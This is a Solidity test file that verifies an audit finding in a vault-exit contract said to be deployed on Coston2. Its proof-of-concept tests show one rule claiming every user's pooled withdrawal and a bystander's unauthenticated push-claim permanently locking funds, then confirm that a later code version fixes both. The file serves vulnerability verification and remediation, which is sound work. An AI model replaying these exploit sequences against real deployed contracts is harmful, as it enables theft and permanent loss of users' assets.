// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol";

import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {IConfidentialTrigger} from "../../src/Interfaces.sol";
import {Trimmy} from "../../src/Trimmy.sol";
import {MockERC20, MockFtsoV2, MockRegistry} from "../mocks/Mocks.sol";

/*//////////////////////////////////////////////////////////////////////////////
                    M-2 — the shared per-period withdrawal bucket

  CLAIM UNDER TEST: "claim() pays one rule the entire per-period vault withdrawal
  bucket, so the first claimer takes every other user's queued assets."

  This file settles it against two different pieces of code:

    * `DEPLOYED`  — the EXACT runtime bytecode live at
      0xeaF2eA3924D5337B2Dd22ae7BFCACEdAc3D913D5 on Coston2, reconstructed by
      re-running the recorded creation bytecode from
      broadcast/Deploy.s.sol/114/run-1786085219320.json against local mocks.
      `test_deployedBytecodeIsByteIdenticalToCoston2` proves the reconstruction
      is the live contract and not a transcription of it.

    * `HEAD`      — src/Trimmy.sol as it stands now, which grew a `pendingAssets`
      field at 16:03 today (mid-investigation) that caps the payout.

  The vault mock is a transcription of the VERIFIED MyERC4626 source fetched from
  the Coston2 explorer for the allowlisted venue
  0x9E63a5D282F2fBb7DcE822B98e363b2719D28319. Each modelled behaviour carries its
  source line number.
//////////////////////////////////////////////////////////////////////////////*/

/// @notice Faithful model of MyERC4626 (verified source, Coston2). Modelled behaviours:
///   L15   PERIOD_DURATION = 1 days, so `_getPeriodFromDate` == UTC day index.
///   L376  period = dayIndex(block.timestamp + lagDuration)  — chosen at redeem time.
///   L385  pendingWithdrawAssets[_receiver][period] += _assets   <-- POOLED PER RECEIVER
///   L386  pendingWithdrawShares[_receiver][period] += _shares
///   L387  requestTimestamps[_receiver][period] = block.timestamp
///   L388  pendingWithdrawLag[_receiver][period] = lagDuration
///   L86   claimWithdraw(period) is `public`, gates on period < dayIndex(now),
///         and calls _completeWithdraw(MSG.SENDER, period).
///   L401  _assets = pendingWithdrawAssets[receiver][period]
///   L402  require(_assets > 0, NoPendingWithdrawAssets())      <-- REVERTS, not silent 0
///   L407  delete the WHOLE bucket
///   L411  safeTransfer(asset, _receiverAddr, _assets)          <-- pays the WHOLE bucket
///   L133  claim(year, month, day, receiverAddr) is `public` with NO ACCESS CONTROL
///   L182  setLagDuration is `public` with NO ACCESS CONTROL
contract RealVault is ERC20 {
    using SafeERC20 for IERC20;

    IERC20 public immutable assetToken;
    uint256 public lagDuration = 300; // live value read from chain via `cast call`

    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawAssets;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawShares;
    mapping(address => mapping(uint256 => uint256)) public requestTimestamps;
    mapping(address => mapping(uint256 => uint256)) public pendingWithdrawLag;

    error InvalidPeriod();
    error NoPendingWithdrawAssets();
    error TooEarly();

    constructor(IERC20 a) ERC20("TESTearnXRP", "TESTearnXRP") {
        assetToken = a;
    }

    function decimals() public view override returns (uint8) {
        return MockERC20(address(assetToken)).decimals();
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    /// @dev src L182 — public, unauthenticated.
    function setLagDuration(uint256 v) external {
        require(v > 0);
        lagDuration = v;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        assetToken.safeTransferFrom(msg.sender, address(this), assets);
        shares = assets; // 1:1 share price, as on the live vault today
        _mint(receiver, shares);
    }

    /// @dev ERC4626.redeem -> _withdraw override, src L362-392.
    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        if (owner != msg.sender) _spendAllowance(owner, msg.sender, shares);
        _burn(owner, shares);
        assets = shares;

        uint256 period = (block.timestamp + lagDuration) / 1 days; // src L376-377
        pendingWithdrawAssets[receiver][period] += assets; // src L385 — POOLED
        pendingWithdrawShares[receiver][period] += shares; // src L386
        requestTimestamps[receiver][period] = block.timestamp; // src L387
        pendingWithdrawLag[receiver][period] = lagDuration; // src L388
    }

    /// @dev src L86-95. Pays the WHOLE [msg.sender][period] bucket to msg.sender.
    function claimWithdraw(uint256 period) external returns (uint256 assets) {
        if (period >= block.timestamp / 1 days) revert InvalidPeriod(); // src L88-91
        assets = _completeWithdraw(msg.sender, period);
    }

    /// @dev src L133-152. PUBLIC PUSH-CLAIM, NO ACCESS CONTROL. Anyone may force any
    ///      receiver's bucket to be paid out to that receiver.
    function claim(uint256 year, uint256 month, uint256 day, address receiverAddr)
        external
        returns (uint256 shares, uint256 assets)
    {
        uint256 period = _daysFromCivil(year, month, day);
        if (block.timestamp < period * 1 days) revert TooEarly(); // src L143-146
        _requireLagElapsed(receiverAddr, period); // src L148
        shares = pendingWithdrawShares[receiverAddr][period];
        assets = _completeWithdraw(receiverAddr, period);
    }

    /// @dev src L394-412.
    function _completeWithdraw(address receiverAddr, uint256 period)
        internal
        returns (uint256 assets)
    {
        assets = pendingWithdrawAssets[receiverAddr][period]; // src L401
        if (assets == 0) revert NoPendingWithdrawAssets(); // src L402
        delete pendingWithdrawAssets[receiverAddr][period]; // src L407
        delete pendingWithdrawShares[receiverAddr][period]; // src L408
        delete requestTimestamps[receiverAddr][period]; // src L409
        delete pendingWithdrawLag[receiverAddr][period]; // src L410
        assetToken.safeTransfer(receiverAddr, assets); // src L411 — WHOLE bucket
    }

    /// @dev src L414-427.
    function _requireLagElapsed(address receiverAddr, uint256 period) internal view {
        uint256 requestTs = requestTimestamps[receiverAddr][period];
        uint256 lagAtRequest = pendingWithdrawLag[receiverAddr][period];
        if (lagAtRequest < 1 days && lagAtRequest > 0) {
            if (requestTs == 0) revert TooEarly();
            if (block.timestamp < requestTs + lagAtRequest) revert TooEarly();
        }
    }

    /// @dev Inverse of DateUtils for test convenience: period (day index) -> civil date.
    function periodToDate(uint256 p) external pure returns (uint256 y, uint256 m, uint256 d) {
        return _civilFromDays(p);
    }

    function _daysFromCivil(uint256 y, uint256 m, uint256 d) internal pure returns (uint256) {
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        int256 yi = int256(y);
        yi -= m <= 2 ? int256(1) : int256(0);
        int256 era = (yi >= 0 ? yi : yi - 399) / 400;
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        uint256 yoe = uint256(yi - era * 400);
        uint256 mp = m > 2 ? m - 3 : m + 9;
        uint256 doy = (153 * mp + 2) / 5 + d - 1;
        uint256 doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        return uint256(era * 146097 + int256(doe) - 719468);
    }

    function _civilFromDays(uint256 z_) internal pure returns (uint256 y, uint256 m, uint256 d) {
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        int256 z = int256(z_) + 719468;
        int256 era = (z >= 0 ? z : z - 146096) / 146097;
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        uint256 doe = uint256(z - era * 146097);
        uint256 yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
        // test fixture: the value is a bound()-ed or oracle-derived quantity known to fit the target width; a revert here would mask the behaviour being asserted.
        // forge-lint: disable-next-line(unsafe-typecast)
        int256 yy = int256(yoe) + era * 400;
        uint256 doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
        uint256 mp = (5 * doy + 2) / 153;
        d = doy - (153 * mp + 2) / 5 + 1;
        m = mp < 10 ? mp + 3 : mp - 9;
        y = uint256(m <= 2 ? yy + 1 : yy);
    }
}

/// @notice ABI of the DEPLOYED Trimmy. `RuleParams` is unchanged between the deployed
///         build and HEAD; `RuleLegacy` is the 24-field struct the deployed contract
///         returns (HEAD returns 25 — it appended `pendingAssets`). Enum members are
///         declared as `uint8`, which is their ABI encoding, so this interface is
///         calldata-identical to the real one.
interface ITrimmyDeployed {
    struct RuleParams {
        uint8 sellTokenId;
        uint8 buyTokenId;
        uint8 verb;
        uint8 venueId;
        uint8 trigger;
        uint128 totalSellAmount;
        uint128 partSellAmount;
        uint128 minOutAbsolute;
        uint128 triggerValue;
        uint64 expiry;
        uint16 slippageBips;
        uint16 protocolFeeBips;
        uint128 keeperFeeFlat;
        uint128 keeperFeeBudget;
    }

    struct RuleLegacy {
        address account;
        uint32 epoch;
        uint8 sellTokenId;
        uint8 buyTokenId;
        uint8 verb;
        uint8 venueId;
        uint8 trigger;
        bool active;
        uint128 totalSellAmount;
        uint128 partSellAmount;
        uint128 spent;
        uint128 minOutAbsolute;
        uint128 triggerValue;
        uint128 latchedPrice;
        uint64 nextEligibleAt;
        uint64 expiry;
        uint64 claimableAt;
        uint64 claimPeriod;
        uint128 keeperFeeFlat;
        uint128 keeperFeeBudget;
        uint128 keeperFeePaid;
        uint128 pendingShares;
        uint16 slippageBips;
        uint16 protocolFeeBips;
    }

    function arm(RuleParams calldata p) external returns (uint256 ruleId);
    function execute(uint256 ruleId) external payable;
    function claim(uint256 ruleId) external;
    function ruleAt(uint256 ruleId) external view returns (RuleLegacy memory);
    function tokenCount() external view returns (uint256);
}

contract M2VerifyTest is Test {
    address internal constant REGISTRY_ADDR = 0xaD67FE66660Fb8dFE9d6b1b4240d8650e30F6019;

    // Live immutables, so the reconstructed runtime is byte-identical to Coston2.
    uint64 internal constant LIVE_MAX_FEED_AGE = 120;
    address internal constant LIVE_FEE_SINK = 0x38d58d1BEA8FF21fd8397494f17F64A99bcF8E83;

    /// keccak256 of `eth_getCode(0xeaF2eA3924D5337B2Dd22ae7BFCACEdAc3D913D5)` on Coston2,
    /// measured 2026-08-07 via `cast code ... | cast keccak`.
    bytes32 internal constant COSTON2_RUNTIME_HASH =
        0x260468008c61c42709beaf28f15dce15a969cfe4354ebf4082ca462a95d6b725;

    bytes21 internal constant FEED_XRP =
        bytes21(uint168(0x015852502f55534400000000000000000000000000));
    bytes21 internal constant FEED_FLR =
        bytes21(uint168(0x01464c522f55534400000000000000000000000000));

    MockERC20 internal fxrp;
    MockERC20 internal wflr;
    RealVault internal vault;
    MockFtsoV2 internal ftso;

    address internal alice = makeAddr("alice");
    address internal mallory = makeAddr("mallory");
    address internal keeper = makeAddr("keeper");
    address internal bystander = makeAddr("bystander");

    function setUp() public {
        vm.warp(10 days);
        fxrp = new MockERC20("FTestXRP", "FXRP", 6);
        wflr = new MockERC20("WC2FLR", "WC2FLR", 18);
        vault = new RealVault(IERC20(address(fxrp)));

        ftso = new MockFtsoV2();
        MockRegistry reg = new MockRegistry();
        vm.etch(REGISTRY_ADDR, address(reg).code);
        MockRegistry(REGISTRY_ADDR).setFtso(address(ftso));
        ftso.setFeed(FEED_XRP, 3_000_000, 6, uint64(vm.getBlockTimestamp()));
        ftso.setFeed(FEED_FLR, 20_000, 6, uint64(vm.getBlockTimestamp()));
    }

    // ---------------------------------------------------------------------------------
    // Deployment helpers
    // ---------------------------------------------------------------------------------

    /// @notice Re-run the recorded creation bytecode of the live deployment with local
    ///         mocks substituted for the Coston2 allowlist. Token/venue configuration
    ///         lives in storage, not in code, so the resulting RUNTIME bytecode is
    ///         byte-identical to the live contract as long as the two immutables match.
    function _deployRealBytecode() internal returns (ITrimmyDeployed t) {
        bytes memory initPrefix =
            vm.parseBytes(vm.readFile("test/fixtures/trimmy-deployed-initcode.hex"));

        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wflr), feedId: FEED_FLR, decimals: 18});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(0xdead), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });

        bytes memory initcode =
            bytes.concat(initPrefix, abi.encode(tokens, venues, LIVE_MAX_FEED_AGE, LIVE_FEE_SINK));

        address addr;
        assembly {
            addr := create(0, add(initcode, 0x20), mload(initcode))
        }
        require(addr != address(0), "deploy of recorded bytecode failed");
        t = ITrimmyDeployed(addr);
    }

    /// @notice HEAD, same live-shaped allowlist.
    function _deployHead() internal returns (Trimmy) {
        Trimmy.TokenCfg[] memory tokens = new Trimmy.TokenCfg[](2);
        tokens[0] = Trimmy.TokenCfg({token: address(fxrp), feedId: FEED_XRP, decimals: 6});
        tokens[1] = Trimmy.TokenCfg({token: address(wflr), feedId: FEED_FLR, decimals: 18});
        Trimmy.VenueCfg[] memory venues = new Trimmy.VenueCfg[](2);
        venues[0] = Trimmy.VenueCfg({
            target: address(0xdead), kind: Trimmy.VenueKind.SWAP_ROUTER_V3, feeTier: 3000
        });
        venues[1] = Trimmy.VenueCfg({
            target: address(vault), kind: Trimmy.VenueKind.QUEUED_VAULT, feeTier: 0
        });
        return new Trimmy(
            tokens, venues, LIVE_MAX_FEED_AGE, LIVE_FEE_SINK, IConfidentialTrigger(address(0))
        );
    }

    function _exitParams(uint128 amt) internal view returns (ITrimmyDeployed.RuleParams memory p) {
        p = ITrimmyDeployed.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: 2, // EXIT_VAULT
            venueId: 1, // the queued vault, as on chain
            trigger: 2, // SCHEDULE
            totalSellAmount: amt,
            partSellAmount: amt,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    function _headExitParams(uint128 amt) internal view returns (Trimmy.RuleParams memory p) {
        p = Trimmy.RuleParams({
            sellTokenId: 0,
            buyTokenId: 0,
            verb: Trimmy.Verb.EXIT_VAULT,
            venueId: 1,
            trigger: Trimmy.Trigger.SCHEDULE,
            totalSellAmount: amt,
            partSellAmount: amt,
            minOutAbsolute: 0,
            triggerValue: 3600,
            expiry: uint64(block.timestamp + 30 days),
            slippageBips: 0,
            protocolFeeBips: 0,
            keeperFeeFlat: 0,
            keeperFeeBudget: 0
        });
    }

    /// @dev Give `who` `amt` vault shares AND park those shares in Trimmy, which is the
    ///      only way an EXIT_VAULT rule can reach `_doQueueRedeem` under the live
    ///      allowlist (see test_exitVaultIsUnreachableWithoutDonatedShares).
    function _fund(address who, address trimmy, uint128 amt) internal {
        fxrp.mint(who, uint256(amt) * 2);
        vm.startPrank(who);
        fxrp.approve(address(vault), type(uint256).max);
        vault.deposit(amt, who);
        vault.transfer(trimmy, amt);
        fxrp.approve(trimmy, type(uint256).max);
        vm.stopPrank();
    }

    // =================================================================================
    // 0. Provenance — the bytecode under test IS the Coston2 deployment
    // =================================================================================

    function test_deployedBytecodeIsByteIdenticalToCoston2() public {
        ITrimmyDeployed t = _deployRealBytecode();
        bytes memory runtime = address(t).code;
        assertEq(
            keccak256(runtime),
            COSTON2_RUNTIME_HASH,
            "reconstructed runtime is NOT the live Coston2 contract"
        );
        assertEq(t.tokenCount(), 2, "allowlist wired");
        console2.log("runtime bytes:", runtime.length);
    }

    /// @notice HEAD is a different contract. Guards against this file silently testing
    ///         the same code twice if someone rebuilds the fixture.
    function test_headIsNotTheDeployedBytecode() public {
        assertTrue(
            keccak256(address(_deployHead()).code) != COSTON2_RUNTIME_HASH,
            "HEAD unexpectedly equals the deployed runtime"
        );
    }

    // =================================================================================
    // 1. M-2 on the DEPLOYED bytecode
    // =================================================================================

    /// @notice THE CLAIM. Two rules, two different accounts, same period. Rule M queued
    ///         1 unit. Rule M's claim() pays Mallory the ENTIRE [Trimmy][period] bucket,
    ///         including every unit Alice queued.
    function test_M2_deployed_firstClaimerTakesTheWholeBucket() public {
        ITrimmyDeployed t = _deployRealBytecode();

        _fund(alice, address(t), 100e6);
        _fund(mallory, address(t), 1);

        vm.prank(alice);
        uint256 ra = t.arm(_exitParams(100e6));
        vm.prank(mallory);
        uint256 rm = t.arm(_exitParams(1));

        vm.startPrank(keeper);
        t.execute(ra);
        t.execute(rm);
        vm.stopPrank();

        uint64 period = t.ruleAt(ra).claimPeriod;
        assertEq(period, t.ruleAt(rm).claimPeriod, "precondition: one shared bucket");
        assertEq(
            vault.pendingWithdrawAssets(address(t), period),
            100e6 + 1,
            "bucket is keyed [Trimmy][period] and pools BOTH rules"
        );

        vm.warp(t.ruleAt(rm).claimableAt);

        uint256 before = fxrp.balanceOf(mallory);
        vm.prank(mallory);
        t.claim(rm);
        uint256 gained = fxrp.balanceOf(mallory) - before;

        console2.log("mallory queued        :", uint256(1));
        console2.log("mallory was paid      :", gained);
        console2.log("alice queued          :", uint256(100e6));

        assertEq(gained, 100e6 + 1, "M-2: rule M was paid the whole bucket");
        assertGt(gained, 1, "M-2: rule M was paid more than it queued");

        // Alice's rule still says it has 100e6 pending, but the bucket is gone and the
        // real vault reverts rather than paying zero. Trimmy has no rescue function.
        assertEq(t.ruleAt(ra).pendingShares, 100e6, "alice still shows pending");
        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(alice);
        t.claim(ra);
    }

    /// @notice Same defect with no attacker at all: one honest user with two rules in one
    ///         period. The first claim takes both; the second is permanently wedged.
    function test_M2_deployed_sameUserSecondRuleIsWedged() public {
        ITrimmyDeployed t = _deployRealBytecode();
        _fund(alice, address(t), 60e6);

        vm.startPrank(alice);
        uint256 r1 = t.arm(_exitParams(30e6));
        uint256 r2 = t.arm(_exitParams(30e6));
        vm.stopPrank();

        vm.startPrank(keeper);
        t.execute(r1);
        t.execute(r2);
        vm.stopPrank();

        vm.warp(t.ruleAt(r1).claimableAt);
        vm.prank(keeper);
        t.claim(r1);

        assertEq(t.ruleAt(r1).pendingShares, 0);
        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(keeper);
        t.claim(r2);
        assertEq(t.ruleAt(r2).pendingShares, 30e6, "rule 2 wedged forever, no rescue exists");
    }

    /// @notice The vault's PUBLIC push-claim, deployed code. A bystander calls
    ///         vault.claim(y,m,d,Trimmy) — no access control, src L133 — for one wei of
    ///         gas. The assets land in Trimmy. The deployed `claim()` has no try/catch, so
    ///         its inner `claimWithdraw` now hits `require(_assets > 0)` and the WHOLE
    ///         transaction reverts. The rule can never be claimed by anyone, ever, and the
    ///         assets sit in a contract with no sweep, owner, or rescue function.
    ///         Total, permanent, unilateral destruction of the position by any passerby.
    function test_M2_deployed_publicPushClaimPermanentlyBricksTheRule() public {
        ITrimmyDeployed t = _deployRealBytecode();
        _fund(alice, address(t), 100e6);

        vm.prank(alice);
        uint256 ra = t.arm(_exitParams(100e6));
        vm.prank(keeper);
        t.execute(ra);

        uint64 period = t.ruleAt(ra).claimPeriod;
        vm.warp(t.ruleAt(ra).claimableAt);

        (uint256 y, uint256 m, uint256 d) = vault.periodToDate(period);
        vm.prank(bystander);
        vault.claim(y, m, d, address(t)); // permissionless push

        assertEq(vault.pendingWithdrawAssets(address(t), period), 0, "bucket pushed out");
        // 200e6 = the 100e6 the vault just pushed in, plus the 100e6 of FXRP `execute`
        // pulled from alice and never used (an artifact of EXIT_VAULT selling FXRP rather
        // than the share token — see test_exitVaultIsUnreachableWithoutDonatedShares).
        assertEq(fxrp.balanceOf(address(t)), 200e6, "assets are sitting inside Trimmy");

        // Every future claim of this rule reverts. There is no other code path that can
        // move this token out of Trimmy: no owner, no sweep, no rescue.
        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(keeper);
        t.claim(ra);

        vm.warp(block.timestamp + 3650 days);
        vm.expectRevert(RealVault.NoPendingWithdrawAssets.selector);
        vm.prank(alice);
        t.claim(ra);

        assertEq(fxrp.balanceOf(alice), 0, "alice was paid nothing, ever");
        assertEq(t.ruleAt(ra).pendingShares, 100e6, "rule bricked with pendingShares set");
        console2.log("permanently locked in Trimmy:", fxrp.balanceOf(address(t)));
    }

    // =================================================================================
    // 2. The same three scenarios on HEAD
    // =================================================================================

    function test_M2_head_firstClaimerCannotOverTake() public {
        Trimmy t = _deployHead();
        _fund(alice, address(t), 100e6);
        _fund(mallory, address(t), 1);

        vm.prank(alice);
        uint256 ra = t.arm(_headExitParams(100e6));
        vm.prank(mallory);
        uint256 rm = t.arm(_headExitParams(1));

        vm.startPrank(keeper);
        t.execute(ra);
        t.execute(rm);
        vm.stopPrank();

        assertEq(t.ruleAt(ra).claimPeriod, t.ruleAt(rm).claimPeriod, "still one shared bucket");

        vm.warp(t.ruleAt(rm).claimableAt);

        uint256 mBefore = fxrp.balanceOf(mallory);
        vm.prank(mallory);
        t.claim(rm);
        assertEq(fxrp.balanceOf(mallory) - mBefore, 1, "HEAD: paid exactly what it queued");

        uint256 aBefore = fxrp.balanceOf(alice);
        vm.prank(alice);
        t.claim(ra);
        assertEq(fxrp.balanceOf(alice) - aBefore, 100e6, "HEAD: alice made whole");
    }

    function test_M2_head_sameUserTwoRulesBothSettle() public {
        Trimmy t = _deployHead();
        _fund(alice, address(t), 60e6);

        vm.startPrank(alice);
        uint256 r1 = t.arm(_headExitParams(30e6));
        uint256 r2 = t.arm(_headExitParams(30e6));
        vm.stopPrank();

        vm.startPrank(keeper);
        t.execute(r1);
        t.execute(r2);
        vm.stopPrank();

        vm.warp(t.ruleAt(r1).claimableAt);
        vm.startPrank(keeper);
        t.claim(r1);
        t.claim(r2);
        vm.stopPrank();
        assertEq(t.ruleAt(r2).pendingShares, 0, "HEAD: both rules settle");
    }

    function test_M2_head_publicPushClaimStillPaysTheUser() public {
        Trimmy t = _deployHead();
        _fund(alice, address(t), 100e6);

        vm.prank(alice);
        uint256 ra = t.arm(_headExitParams(100e6));
        vm.prank(keeper);
        t.execute(ra);

        uint64 period = t.ruleAt(ra).claimPeriod;
        vm.warp(t.ruleAt(ra).claimableAt);
        (uint256 y, uint256 m, uint256 d) = vault.periodToDate(period);
        vm.prank(bystander);
        vault.claim(y, m, d, address(t));

        uint256 aBefore = fxrp.balanceOf(alice);
        vm.prank(keeper);
        t.claim(ra);
        assertEq(fxrp.balanceOf(alice) - aBefore, 100e6, "HEAD: user still paid after a push");
    }

    /// @notice Hardest case for the HEAD fix: TWO rules from TWO accounts pooled in one
    ///         bucket, and a third party pushes the whole bucket in before either can
    ///         claim. Both rules must still settle for exactly what they queued.
    function test_M2_head_pushClaimPlusSharedBucketStillSettlesBothExactly() public {
        Trimmy t = _deployHead();
        _fund(alice, address(t), 100e6);
        _fund(mallory, address(t), 5e6);

        vm.prank(alice);
        uint256 ra = t.arm(_headExitParams(100e6));
        vm.prank(mallory);
        uint256 rm = t.arm(_headExitParams(5e6));

        vm.startPrank(keeper);
        t.execute(ra);
        t.execute(rm);
        vm.stopPrank();

        uint64 period = t.ruleAt(ra).claimPeriod;
        vm.warp(t.ruleAt(ra).claimableAt);
        (uint256 y, uint256 m, uint256 d) = vault.periodToDate(period);
        vm.prank(bystander);
        vault.claim(y, m, d, address(t)); // pushes 105e6 into Trimmy

        uint256 mBefore = fxrp.balanceOf(mallory);
        vm.prank(mallory);
        t.claim(rm);
        assertEq(fxrp.balanceOf(mallory) - mBefore, 5e6, "mallory: exactly her own");

        uint256 aBefore = fxrp.balanceOf(alice);
        vm.prank(alice);
        t.claim(ra);
        assertEq(fxrp.balanceOf(alice) - aBefore, 100e6, "alice: exactly her own");
    }

    // =================================================================================
    // 3. Reachability on the LIVE allowlist
    // =================================================================================

    /// @notice The severity question. `_doQueueRedeem` burns SHARE tokens Trimmy must
    ///         hold, but the live token allowlist is FXRP and WC2FLR only — the share
    ///         token 0x9E63... is a VENUE, not a TOKEN. So `execute` on an EXIT_VAULT
    ///         rule pulls FXRP and then tries to burn that many SHARES from a contract
    ///         whose share balance is zero, and reverts.
    ///
    ///         Measured on chain 2026-08-07:
    ///           tokenAt(0) = 0x0b6A3645...(FXRP, 6dp)   tokenAt(1) = 0xC67DCE33...(WC2FLR, 18dp)
    ///           venueAt(1) = 0x9E63a5D2...(QUEUED_VAULT)
    ///           TESTearnXRP.balanceOf(0xeaF2eA39...) == 0
    function test_exitVaultIsUnreachableWithoutDonatedShares() public {
        ITrimmyDeployed t = _deployRealBytecode();

        // Alice has FXRP and an allowance, but nobody has parked shares in Trimmy.
        fxrp.mint(alice, 1_000e6);
        vm.startPrank(alice);
        fxrp.approve(address(t), type(uint256).max);
        uint256 ra = t.arm(_exitParams(100e6));
        vm.stopPrank();

        assertEq(vault.balanceOf(address(t)), 0, "no shares held, as on chain");

        vm.prank(keeper);
        vm.expectRevert(); // ERC20InsufficientBalance burning shares Trimmy does not have
        t.execute(ra);
    }

    /// @notice ...and a single unauthenticated share transfer from anyone unlocks it.
    ///         This is what makes M-2 latent rather than dead: no redeploy, no governance,
    ///         no allowlist change is needed to arm the vulnerable path.
    function test_oneShareTransferUnlocksTheVulnerablePath() public {
        ITrimmyDeployed t = _deployRealBytecode();
        _fund(alice, address(t), 100e6);

        vm.prank(alice);
        uint256 ra = t.arm(_exitParams(100e6));
        vm.prank(keeper);
        t.execute(ra);

        assertEq(t.ruleAt(ra).pendingShares, 100e6, "claim path reached");
    }
}
